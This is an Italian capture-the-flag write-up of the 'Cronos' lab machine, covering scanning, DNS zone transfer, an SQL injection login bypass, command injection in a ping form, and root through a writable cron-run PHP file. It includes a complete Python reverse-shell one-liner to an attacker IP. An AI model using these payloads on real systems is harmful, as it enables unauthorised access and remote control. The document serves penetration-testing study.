# Cronos

## Reconnaissance

Per prima cosa eseguo una scansione iniziale con nmap.

```text
sudo nmap -sC -sV -O -oA /usr/share/nmap/initial 10.10.10.13
```

* **-sC**: scipt nmap di default
* **-sV**: per rilevare la versione dei servizi
* **-O**: per rilevare il SO
* **-oA**: per stampare tutti i formati e salvarli nel file _nmap/initial_

Le porte aperte sono le seguenti:

* **Porta 22**: OpenSSH 7.2p2
* **Porta 53**: ISC BIND 9.10.3-P4
* **Porta 80**: Apache 2.4.18

```text
Nmap scan report for 10.10.10.13
Host is up (0.10s latency).
Not shown: 997 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 18:b9:73:82:6f:26:c7:78:8f:1b:39:88:d8:02:ce:e8 (RSA)
|   256 1a:e6:06:a6:05:0b:bb:41:92:b0:28:bf:7f:e5:96:3b (ECDSA)
|_  256 1a:0e:e7:ba:00:cc:02:01:04:cd:a3:a9:3f:5e:22:20 (ED25519)
53/tcp open  domain  ISC BIND 9.10.3-P4 (Ubuntu Linux)
| dns-nsid:
|_  bind.version: 9.10.3-P4-Ubuntu
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.18 (Ubuntu)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.92%E=4%D=9/20%OT=22%CT=1%CU=42347%PV=Y%DS=2%DC=I%G=Y%TM=650AA21
OS:1%P=x86_64-pc-linux-gnu)SEQ(SP=103%GCD=1%ISR=108%TI=Z%II=I%TS=8)SEQ(SP=1
OS:03%GCD=1%ISR=108%TI=Z%CI=I%II=I%TS=8)OPS(O1=M54DST11NW7%O2=M54DST11NW7%O
OS:3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST11NW7%O6=M54DST11)WIN(W1=7120%W2=
OS:7120%W3=7120%W4=7120%W5=7120%W6=7120)ECN(R=Y%DF=Y%T=40%W=7210%O=M54DNNSN
OS:W7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%D
OS:F=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O
OS:=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W
OS:=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%R
OS:IPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Enumeration

Innanzitutto, vedo cosa c'è sulla porta 80:

<p align="center">
  <img src="/Immagini/Linux-Box/Cronos/cronos-1.png" />
</p>

Facendo una ricerca su internet sembra che questa pagina sia dovuta a un errore di configurazione nel mapping tra l'ip e l'host.

Provo quindi ad utilizzare nslookup per identificare l'host:

```text
nslookup
> server 10.10.10.13
Default server: 10.10.10.13
Address: 10.10.10.13#53
10.10.10.13.in-addr.arpa  name= ns1.cronos.htb
```

Quindi aggiungo _cronos.htb_ al file _/ect/hosts_.

Cerco di capire se c'è la possibilita di effettuare un trasferimento di zona (zone transfer) utilizzando il comando dig:

```text
dig axfr @10.10.10.13 cronos.htb
```

La risposta ottenuta è la seguente:

```text
; <<>> DiG 9.18.1-1-Debian <<>> axfr @10.10.10.13 cronos.htb
; (1 server found)
;; global options: +cmd
cronos.htb.		604800	IN	SOA	cronos.htb. admin.cronos.htb. 3 604800 86400 2419200 604800
cronos.htb.		604800	IN	NS	ns1.cronos.htb.
cronos.htb.		604800	IN	A	10.10.10.13
admin.cronos.htb.	604800	IN	A	10.10.10.13
ns1.cronos.htb.		604800	IN	A	10.10.10.13
www.cronos.htb.		604800	IN	A	10.10.10.13
cronos.htb.		604800	IN	SOA	cronos.htb. admin.cronos.htb. 3 604800 86400 2419200 604800
;; Query time: 79 msec
;; SERVER: 10.10.10.13#53(10.10.10.13) (TCP)
;; WHEN: Wed Sep 20 10:23:45 EDT 2023
;; XFR size: 7 records (messages 1, bytes 203)
```

Quindi il server DNS è vulnerabile al trasferimento di zona. Proseguo aggiornando il file _/ect/hosts_ e visito la pagina _admin.cronos.htb_:

<p align="center">
  <img src="/Immagini/Linux-Box/Cronos/cronos-2.png" />
</p>

## Exploitation

Come primo tentativo utilizzo una banale [cheat sheet](https://github.com/mrsuman2002/SQL-Injection-Authentication-Bypass-Cheat-Sheet/blob/master/SQL%20Injection%20Cheat%20Sheet.txt) per capire se il form è vulnerabile all'SQL Injection.

Dopo diversi tentativi, scopro che è vulnerabile riempendo il campo username nel seguente modo:

```text
admin' #
```

Una volta dentro mi ritrovo questa pagina:

<p align="center">
  <img src="/Immagini/Linux-Box/Cronos/cronos-3.png" />
</p>

C'è un semplice form con la possibilità di scegliere tra due comandi: traceroute e ping. Di conseguenza, ipotizzo che questa funzionalità comunica direttamente con il SO. Quindi provo semplicemente a concatenare un comando alla richiesta.

<p align="center">
  <img src="/Immagini/Linux-Box/Cronos/cronos-4.png" />
</p>

**E' vulnerabile!**

Riesco a scoprire quindi che il primo flag è collegato all'utente noulis.

## Privilege Escalation

Per prima cosa cerco un modo per avviare una reverse shell. Da una rapida ricerca mi imbatto in questo comando python:

```text
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.8",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

Concateno il tutto al comando traceroute e avvio un listener sulla mia macchina:

<p align="center">
  <img src="/Immagini/Linux-Box/Cronos/cronos-5.png" />
</p>

Per prima cosa, dato il nome della macchina, controllo il file crontab:

<p align="center">
  <img src="/Immagini/Linux-Box/Cronos/cronos-6.png" />
</p>

Da qui scopro che il file php artisan viene eseguito ogni minuto e che ho la possibilità di modificarlo.

Quindi trovo un [modo](https://github.com/pentestmonkey/php-reverse-shell) per creare un'altra reverse shell e avvio un listener.

**Sono root!**

<p align="center">
  <img src="/Immagini/Linux-Box/Cronos/cronos-7.png" />
</p>
